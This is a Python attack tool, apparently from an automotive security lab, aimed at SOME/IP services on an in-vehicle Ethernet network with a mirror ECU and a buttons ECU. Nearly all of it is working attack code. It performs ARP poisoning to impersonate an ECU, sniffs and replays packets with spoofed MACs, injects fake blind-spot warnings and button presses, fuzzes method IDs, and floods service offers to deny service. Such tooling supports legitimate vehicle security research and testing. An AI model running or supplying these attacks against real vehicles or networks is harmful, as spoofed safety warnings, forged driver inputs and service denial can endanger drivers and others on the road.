"""
someip_attacker.py
SOME/IP (IPv4) attack logic + MAC Spoofing/Sniffing.
"""
import asyncio
import ipaddress
import logging
import re
import threading
import time
import struct
import socket
import os
import sys
from typing import Set, List

# Scapy imports from att_macspoof
from scapy.all import *

from someipy import (
    TransportLayerProtocol,
    ServiceBuilder,
    EventGroup,
    ReturnCode,
)
from someipy.service_discovery import construct_service_discovery
from someipy.server_service_instance import construct_server_service_instance
from someipy.client_service_instance import construct_client_service_instance
from someipy.logging import set_someipy_log_level

from attack_config import *

# Suppress Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# ==========================================
# LOGGING FILTERS (To Fix Console Spam)
# ==========================================
class BlockSomeIPConsole(logging.Filter):
    def filter(self, record):
        return not record.name.startswith('someipy')

class SubscriptionHandler(logging.Handler):
    def __init__(self):
        super().__init__()
        self.subscribed: Set[int] = set()
        self.pattern = re.compile(r'Received subscribe for .* service (0x[0-9a-fA-F]+)')

    def emit(self, record):
        try:
            msg = record.getMessage()
            match = self.pattern.search(msg)
            if match:
                sid = int(match.group(1), 16)
                self.subscribed.add(sid)
        except:
            pass

    def clear(self):
        self.subscribed.clear()

# ==========================================
# MAIN CLASS
# ==========================================
class SomeIPAttacker:
    def __init__(self):
        # SOME/IP State
        self.discovered_services: Set[int] = set()
        self.handler = SubscriptionHandler()

        # MAC Spoofing / Scapy State (from att_macspoof)
        self.mac_stop_event = threading.Event()
        self.mac_all_seen_hashes = set()
        self.mac_all_packets = []
        self.MAC_PCAP_FILE = "attack_capture.pcap"
        self.MCAST_GROUP = "224.224.224.245"
        self.ECU1_IP = "192.168.42.10"
        self.ECU2_IP = "192.168.42.20"

    def print_menu(self):
        print("\n[SOME/IP Main Menu]")
        print("1. Enumerate Services (Active Probing)")
        print("2. Impersonate Service (Fake Events)")
        print("3. Method Fuzzing (Discover Active Methods)")
        print("4. DoS Attack (Offer Flood)")
        print("5. MAC Spoofing & Sniffer (Scapy)")
        print("6. Back to Main Menu")
        print("-" * 70)

    def print_banner(self):
        print("\n" + "=" * 70)
        print("         SOME/IP ACTIVE ATTACKER (IPv4)")
        print("=" * 70)
        print(f" Attacker IP: {ATTACKER_IP4}")
        print(f" Discovered services: {len(self.discovered_services)}")
        if self.discovered_services:
            print("    → " + " ".join(f"0x{s:04X}" for s in sorted(self.discovered_services)))
        print("=" * 70 + "\n")

    # ==========================================
    # ATT_MACSPOOF INTEGRATION (Methods)
    # ==========================================
    def mac_load_existing(self):
        if os.path.exists(self.MAC_PCAP_FILE):
            try:
                existing = rdpcap(self.MAC_PCAP_FILE)
                for p in existing:
                    h = hash(bytes(p))
                    if h not in self.mac_all_seen_hashes:
                        self.mac_all_seen_hashes.add(h)
                        self.mac_all_packets.append(p)
                print(f"{Colors.Y}[+] Loaded {len(existing)} packets → {len(self.mac_all_packets)} unique total{Colors.W}")
            except Exception as e:
                print(f"{Colors.R}[-] Could not read old file: {e}{Colors.W}")

    def mac_live_callback(self, pkt):
        h = hash(bytes(pkt))
        if h not in self.mac_all_seen_hashes:
            self.mac_all_seen_hashes.add(h)
            self.mac_all_packets.append(pkt)

            if not pkt.haslayer(IP) or not pkt.haslayer(UDP):
                return
            src = pkt[IP].src
            dst = pkt[IP].dst
            sport = pkt[UDP].sport
            dport = pkt[UDP].dport
            payload = bytes(pkt[UDP].payload)
            if len(payload) < 8: return

            msg_id = struct.unpack_from("!I", payload, 0)[0]
            service_id = msg_id >> 16
            method_id = msg_id & 0xFFFF
            is_request = (payload[4] & 0x80) == 0

            if dport == 30490:
                print(f"{Colors.Y}[SD]       {Colors.W}{src} → {dst}")
            elif src == self.ECU1_IP and dport == 3001:
                print(f"{Colors.R}[BLIND-SPOT] {Colors.W}{src}:3000 → {dst}:3001  Method=0x{method_id:04X}")
            elif src == self.ECU2_IP and dport == 3000:
                print(f"{Colors.M}[BUTTON/RESET]{Colors.W}{src}:{sport} → {dst}:3000  Method=0x{method_id:04X}")
            else:
                req = "REQ" if is_request else "RSP"
                print(f"{Colors.C}[DATA]     {Colors.W}{src}:{sport} → {dst}:{dport}  {req}  Svc=0x{service_id:04X}  Mtd=0x{method_id:04X}")

    def mac_get_victim_mac(self, ip):
        try:
            mac = getmacbyip(ip)
            return mac if mac else "ff:ff:ff:ff:ff:ff"
        except:
            return "ff:ff:ff:ff:ff:ff"

    def mac_arp_spoof_thread(self, target_ip, victim_ip):
        victim_mac = self.mac_get_victim_mac(victim_ip)
        print(f"{Colors.Y}[SPOOF] {target_ip} → poisoning {victim_ip}{Colors.W}")
        try:
            while not self.mac_stop_event.is_set():
                try:
                    send(ARP(op=2, psrc=target_ip, pdst=victim_ip,
                             hwdst=victim_mac, hwsrc=ATTACKER_MAC),
                         verbose=0, iface=INTERFACE)
                except:
                    pass
                time.sleep(3)
        finally:
            print(f"{Colors.Y}[*] ARP spoofing thread stopped{Colors.W}")

    def mac_impersonate_and_sniff(self):
        print(f"\n{Colors.C}Which ECU to impersonate?{Colors.W}")
        print(" 1. ECU1 - Mirror (192.168.42.10)")
        print(" 2. ECU2 - Buttons (192.168.42.20)")
        c = input(f"\n{Colors.Y}Choice → {Colors.W}").strip()
        if c == "1":
            target, victim, name = self.ECU1_IP, self.ECU2_IP, "Mirror"
        elif c == "2":
            target, victim, name = self.ECU2_IP, self.ECU1_IP, "Buttons"
        else:
            print(f"{Colors.R}Invalid{Colors.W}")
            return

        duration = 15
        print(f"\n{Colors.G}[+] Impersonating {name} ECU for {duration}s{Colors.W}")

        self.mac_stop_event.clear()
        spoof_thread = threading.Thread(target=self.mac_arp_spoof_thread, args=(target, victim), daemon=True)
        spoof_thread.start()

        print(f"\n{Colors.C}=== ATTACK RUNNING – {duration}s ==={Colors.W}\n")

        # Sniff for the duration
        sniff(iface=INTERFACE, prn=self.mac_live_callback, timeout=duration, store=False)

        # Now stop the ARP spoofing
        print(f"\n{Colors.Y}[*] Stopping ARP spoofing...{Colors.W}")
        self.mac_stop_event.set()
        spoof_thread.join()

        print(f"\n{Colors.Y}[*] Attack finished — {len(self.mac_all_packets)} total unique packets{Colors.W}")
        wrpcap(self.MAC_PCAP_FILE, self.mac_all_packets)
        print(f"{Colors.G}[+] Saved → {os.path.abspath(self.MAC_PCAP_FILE)}{Colors.W}")

    def mac_list_mode(self):
        if not os.path.exists(self.MAC_PCAP_FILE):
            print(f"{Colors.R}[-] No capture yet — run attack first{Colors.W}")
            return

        pkts = rdpcap(self.MAC_PCAP_FILE)
        print(f"\n{Colors.C}{Colors.BOLD}=== ALL UNIQUE PACKETS EVER CAPTURED: {len(pkts)} ==={Colors.W}")
        print(f"{'No':>4} {'Type':<8} {'Source':<21} {'Dest':<21} {'Req':<4} {'Service ID':<12} {'Method/Event ID'}")
        print("─" * 98)

        for i, p in enumerate(pkts):
            if not p.haslayer(UDP):
                continue
            src = f"{p[IP].src}:{p[UDP].sport}"
            dst = f"{p[IP].dst}:{p[UDP].dport}"
            payload = bytes(p[UDP].payload)
            if len(payload) < 8:
                sid = mid = "N/A"
                req = ""
            else:
                msg_id = struct.unpack_from("!I", payload, 0)[0]
                sid = msg_id >> 16
                mid = msg_id & 0xFFFF
                req = "REQ" if (payload[4] & 0x80) == 0 else "RSP"

            ptype = "SD" if p[UDP].dport == 30490 else "DATA"
            color = Colors.Y if ptype == "SD" else Colors.G

            print(f"{color}{i:4d}{Colors.W} {ptype:<8} {src:<21} {dst:<21} {req:<4} 0x{sid:04X}       0x{mid:04X}")

        print("─" * 98)

    def mac_replay_mode(self):
        if not os.path.exists(self.MAC_PCAP_FILE):
            print(f"{Colors.R}[-] No capture file. Run sniff first.{Colors.W}")
            return

        pkts = rdpcap(self.MAC_PCAP_FILE)
        self.mac_list_mode()

        choice = input(f"\n{Colors.Y}Packets to replay (e.g. 5 or 3-10 or 1,4,7) → {Colors.W}").strip()
        indices = []
        for part in choice.replace(" ", "").split(","):
            if "-" in part:
                try:
                    a, b = map(int, part.split("-"))
                    indices.extend(range(a, b+1))
                except:
                    continue
            else:
                try:
                    indices.append(int(part))
                except:
                    continue

        to_send = [pkts[i].copy() for i in indices if 0 <= i < len(pkts)]
        if not to_send:
            print(f"{Colors.R}[-] No valid packets selected.{Colors.W}")
            return

        # --- find real MACs for target IPs (if available) ---
        real_macs = {}
        for ip in [self.ECU1_IP, self.ECU2_IP]:
            try:
                mac = getmacbyip(ip)
            except Exception:
                mac = None
            if mac:
                real_macs[ip] = mac
                print(f"{Colors.G}[+] Found {ip} -> {mac}{Colors.W}")

        fix_dst_mac = input(f"{Colors.C}Fix destination MAC? (y/n, recommended) → {Colors.W}").strip().lower() == 'y'
        spoof_src_mac = input(f"{Colors.C}Set source MAC to attacker (spoof)? (y/n) → {Colors.W}").strip().lower() == 'y'

        if fix_dst_mac or spoof_src_mac:
            for pkt in to_send:
                if not pkt.haslayer(IP):
                    continue

                dst_ip = pkt[IP].dst
                if dst_ip == self.MCAST_GROUP:
                    new_dst_mac = "01:00:5e:00:00:fb"
                elif dst_ip in real_macs:
                    new_dst_mac = real_macs[dst_ip]
                else:
                    mac = getmacbyip(dst_ip)
                    new_dst_mac = mac if mac else "ff:ff:ff:ff:ff:ff"

                if pkt.haslayer(Ether):
                    pkt[Ether].dst = new_dst_mac
                    if spoof_src_mac:
                        pkt[Ether].src = ATTACKER_MAC
                else:
                    src_mac = ATTACKER_MAC if spoof_src_mac else get_if_hwaddr(INTERFACE)
                    pkt = Ether(src=src_mac, dst=new_dst_mac) / pkt
        else:
            print(f"{Colors.Y}[!] Not changing Ethernet MACs. Packet may be dropped by ECUs.{Colors.W}")

        fix_session = input(f"{Colors.C}Set fresh session ID? (y/n, recommended) → {Colors.W}").strip().lower() == 'y'
        if fix_session:
            new_session = int(time.time() * 1000) & 0xFFFF
            for pkt in to_send:
                raw = None
                if pkt.haslayer(Raw):
                    raw = pkt[Raw]
                    data = bytearray(raw.load)
                elif pkt.haslayer(UDP) and bytes(pkt[UDP].payload):
                    data = bytearray(bytes(pkt[UDP].payload))
                else:
                    continue

                if len(data) >= 12:
                    data[10:12] = new_session.to_bytes(2, 'big')
                    if pkt.haslayer(Raw):
                        pkt[Raw].load = bytes(data)
                    else:
                        pkt[UDP].remove_payload()
                        pkt = pkt / Raw(bytes(data))
                    print(f"{Colors.Y}[+] Set fresh session ID -> 0x{new_session:04X}{Colors.W}")
                else:
                    print(f"{Colors.R}[-] Packet payload too short for session ID modification.{Colors.W}")

        times = int(input(f"{Colors.C}Spam times (default 1) → {Colors.W}") or "1")

        print(f"\n{Colors.R}[REPLAY ATTACK] Sending {len(to_send)} packet(s) × {times}...{Colors.W}")
        for _ in range(times):
            for pkt in to_send:
                if not pkt.haslayer(Ether):
                    src_mac = ATTACKER_MAC if spoof_src_mac else get_if_hwaddr(INTERFACE)
                    if pkt.haslayer(IP):
                        dst_mac = getmacbyip(pkt[IP].dst) or "ff:ff:ff:ff:ff:ff"
                        pkt = Ether(src=src_mac, dst=dst_mac) / pkt
                    else:
                        pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") / pkt

                try:
                    if pkt.haslayer(IP):
                        if hasattr(pkt[IP], 'chksum'): del pkt[IP].chksum
                        if hasattr(pkt[IP], 'len'): del pkt[IP].len
                    if pkt.haslayer(UDP):
                        if hasattr(pkt[UDP], 'chksum'): del pkt[UDP].chksum
                        if hasattr(pkt[UDP], 'len'): del pkt[UDP].len
                except Exception:
                    pass

                sendp(pkt, iface=INTERFACE, verbose=False)
                time.sleep(0.005)
        print(f"{Colors.G}[+] REPLAY COMPLETE{Colors.W}")

    def mac_spoof_menu(self):
        self.mac_load_existing()
        while True:
            print(f"\n{Colors.C}{Colors.BOLD}╔{'═'*64}╗")
            print(f"║{'  ATTACKER (MAC Spoofing/Scapy)  ':^64}║")
            print(f"╚{'═'*64}╝{Colors.W}")
            print(f" Total unique packets: {len(self.mac_all_packets)}")
            print(" 1. Impersonate + Live Sniff (15s)")
            print(" 2. View all captured packets")
            print(" 3. Replay captured packets")
            print(" q. Back to SOME/IP Menu")

            c = input(f"\n{Colors.C}→ {Colors.W}").strip()

            if c == '1': self.mac_impersonate_and_sniff()
            elif c == '2': self.mac_list_mode()
            elif c == '3': self.mac_replay_mode()
            elif c in ['q','quit']: break

    # ==========================================
    # SOME/IP ASYNC METHODS
    # ==========================================
    async def enumerate_services(self, sd) -> None:
        print("\n[+] Active Service Enumeration")
        try:
            start_hex = await ainput("    Start Service ID (hex): ")
            start_hex = start_hex.strip() or "1000"
            end_hex = await ainput("    End Service ID (hex): ")
            end_hex = end_hex.strip() or "2000"
            start, end = int(start_hex, 16), int(end_hex, 16)
        except:
            print(" [!] Invalid → using 0x1000-0x2000")
            start, end = 0x1000, 0x2000

        total = end - start + 1
        print(f"    Probing 0x{start:04X} → 0x{end:04X} ({total} services)\n")

        self.handler.clear()
        newly_found: List[int] = []

        for sid in range(start, end + 1):
            print(f"    Offering 0x{sid:04X}... ({sid - start + 1}/{total})", end="\r")

            service = ServiceBuilder().with_service_id(sid).with_major_version(1).build()
            port = 3000 + (sid & 0xFFF)

            server = await construct_server_service_instance(
                service,
                instance_id=0x0001,
                endpoint=(ipaddress.IPv4Address(ATTACKER_IP4), port),
                ttl=5,
                sd_sender=sd,
                protocol=TransportLayerProtocol.UDP
            )
            sd.attach(server)
            server.start_offer()

            await asyncio.sleep(PROBE_DURATION)

            if sid in self.handler.subscribed:
                newly_found.append(sid)
                self.discovered_services.add(sid)
                print(f"\n    ✓ ACTIVE → 0x{sid:04X} (subscription received)")

            await server.stop_offer()
            sd.detach(server)

        print(f"\n[+] Probe complete. Newly found: {len(newly_found)} | Total: {len(self.discovered_services)}")

    async def impersonate_service_someip(self, sd, service_id: int):
        print(f"\n[!] Impersonating Service 0x{service_id:04X} - Sending Fake Events for 10 seconds")

        if service_id == 0x1000:
            event_group_id = 0x8000
            event_id = 0x8001
            payload_type = "blind_spot"
            print("    → Sending fake Blind Spot warnings")
        elif service_id == 0x2000:
            event_group_id = 0x9000
            event_id = 0x9001
            payload_type = "button"
            print("    → Sending fake button presses")
        else:
            print(" [!] Unknown service - using generic payload")
            event_group_id = 0x0001
            event_id = 0x0001
            payload_type = "generic"

        event_group = EventGroup(id=event_group_id, event_ids=[event_id])
        service = ServiceBuilder() \
            .with_service_id(service_id) \
            .with_major_version(1) \
            .with_eventgroup(event_group) \
            .build()

        server = await construct_server_service_instance(
            service,
            instance_id=0x0001,
            endpoint=(ipaddress.IPv4Address(ATTACKER_IP4), 5000),
            ttl=10,
            sd_sender=sd,
            cyclic_offer_delay_ms=2000,
            protocol=TransportLayerProtocol.UDP
        )
        sd.attach(server)
        server.start_offer()

        await asyncio.sleep(3)

        try:
            print("    Starting 10-second attack...\n")
            for i in range(20):
                if payload_type == "button":
                    direction = i % 4
                    payload = direction.to_bytes(1, 'big')
                    dirs = ["UP", "RIGHT", "DOWN", "LEFT"]
                    print(f"    → Fake button: {dirs[direction]}")
                elif payload_type == "blind_spot":
                    level = 2 if i % 2 == 0 else 1
                    payload = level.to_bytes(1, 'big')
                    print(f"    → Fake Blind Spot Level {level}")
                else:
                    payload = i.to_bytes(4, 'big')
                    print(f"    → Generic event #{i + 1}")

                server.send_event(event_group_id, event_id, payload)
                await asyncio.sleep(0.5)
        except KeyboardInterrupt:
            print("\n    Stopped early by user.")
        finally:
            await server.stop_offer()
            sd.detach(server)
            print("\n[+] Impersonation attack finished (10 seconds completed).")

    async def fuzz_methods(self, sd, service_id: int):
        print(f"\n[+] Method Fuzzing on Service 0x{service_id:04X}")
        try:
            start_hex = await ainput("    Start Method ID (hex): ")
            start_hex = start_hex.strip() or "0000"
            end_hex = await ainput("    End Method ID (hex): ")
            end_hex = end_hex.strip() or "01FF"
            start, end = int(start_hex, 16), int(end_hex, 16)
        except:
            start, end = 0x0000, 0x01FF

        active = []
        client_port = 6000

        service_def = ServiceBuilder().with_service_id(service_id).with_major_version(1).build()
        client = await construct_client_service_instance(
            service_def,
            instance_id=0x0001,
            endpoint=(ipaddress.IPv4Address(ATTACKER_IP4), client_port),
            ttl=10,
            sd_sender=sd,
            protocol=TransportLayerProtocol.UDP
        )
        sd.attach(client)
        await asyncio.sleep(2)

        try:
            for mid in range(start, end + 1):
                print(f"    Testing 0x{mid:04X}...", end="\r")
                try:
                    result = await asyncio.wait_for(
                        client.call_method(mid, b'\x00'),
                        timeout=1.0
                    )
                    if result.return_code == ReturnCode.E_OK:
                        print(f"\n    ✓ ACTIVE → 0x{mid:04X}")
                        active.append(mid)
                    elif result.return_code != ReturnCode.E_UNKNOWN_METHOD:
                        print(f"\n    ! RESPONSE → 0x{mid:04X} ({result.return_code})")
                except asyncio.TimeoutError:
                    pass
        finally:
            await client.close()
            sd.detach(client)

        print(f"\n[+] Fuzz complete. Found {len(active)} active method(s).")
        if active:
            print("    " + " ".join(f"0x{m:04X}" for m in active))

    async def dos_attacks_someip(self, sd, service_id: int):
        print(f"\n[!] DoS Flood - Aggressive Offer Spam for Service 0x{service_id:04X}")
        print("    20-second timed attack - Overwhelms legitimate offers to redirect/block subscriptions")
        print("    Press Ctrl+C to stop early\n")

        service = ServiceBuilder().with_service_id(service_id).with_major_version(1).build()
        port = 3000 + (service_id & 0xFFF)

        server = await construct_server_service_instance(
            service,
            instance_id=0x0001,
            endpoint=(ipaddress.IPv4Address(ATTACKER_IP4), port),
            ttl=5,
            sd_sender=sd,
            cyclic_offer_delay_ms=10,
            protocol=TransportLayerProtocol.UDP
        )
        sd.attach(server)

        count = 0
        start_time = asyncio.get_event_loop().time()

        try:
            while asyncio.get_event_loop().time() - start_time < 20:
                server.start_offer()
                await asyncio.sleep(0.001)
                server.stop_offer()
                count += 1
                if count % 500 == 0:
                    print(f"    → Spammed {count} offers...")
        except KeyboardInterrupt:
            print("\n    Stopped early by user.")
        finally:
            await server.stop_offer()
            sd.detach(server)
            print(f"\n[+] DoS complete. Total offers spammed: {count}")
            print("    Check Wireshark for massive OfferService flood from attacker")

    async def run(self):
        self.print_banner()

        # --- LOGGING FIX (Nuclear Option) ---
        set_someipy_log_level(logging.DEBUG)
        # Apply filter to ROOT logger to block console spam
        root_logger = logging.getLogger()
        for handler in root_logger.handlers:
            handler.addFilter(BlockSomeIPConsole())

        # Clean specific loggers and attach internal handler
        logger = logging.getLogger('someipy')
        logger.propagate = False
        
        sd_logger = logging.getLogger('someipy.service_discovery')
        sd_logger.handlers = []
        sd_logger.propagate = False
        sd_logger.addHandler(self.handler)
        sd_logger.setLevel(logging.DEBUG)


        sd = await construct_service_discovery(SD_MULTICAST_GROUP, SD_PORT, ATTACKER_IP4)
        while True:
            self.print_menu()
            choice = await ainput("> ")
            choice = choice.strip()

            if choice == "1":
                await self.enumerate_services(sd)
                self.print_banner()
            elif choice in ("2", "3", "4"):
                if not self.discovered_services:
                    print("\n[!] No services discovered. Run 1 first.")
                    continue
                services_list = sorted(self.discovered_services)
                print("\nAvailable services:")
                for i, sid in enumerate(services_list, 1):
                    print(f" {i}. 0x{sid:04X}")
                try:
                    val = await ainput("\nSelect service: ")
                    idx = int(val) - 1
                    selected_sid = services_list[idx]
                except:
                    print("[!] Invalid")
                    continue
                if choice == "2":
                    await self.impersonate_service_someip(sd, selected_sid)
                elif choice == "3":
                    await self.fuzz_methods(sd, selected_sid)
                elif choice == "4":
                    await self.dos_attacks_someip(sd, selected_sid)
            elif choice == "5":
                # Calls the synchronous menu loop for MAC spoofing
                # Uses threading/standard input as in original script
                self.mac_spoof_menu()
            elif choice == "6":
                print("\nReturning to main menu...")
                break
        sd.close()
